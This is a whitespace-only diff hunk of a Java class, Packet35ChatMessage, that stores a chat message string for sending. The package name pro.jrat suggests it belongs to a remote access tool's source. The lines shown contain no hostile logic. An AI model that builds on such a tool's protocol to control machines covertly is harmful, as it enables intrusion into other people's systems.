@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet35ChatMessage extends AbstractOutgoingPacket {
-	
+
 	private String message;
-	
+
 	public Packet35ChatMessage(String message) {
 		this.message = message;
 	}
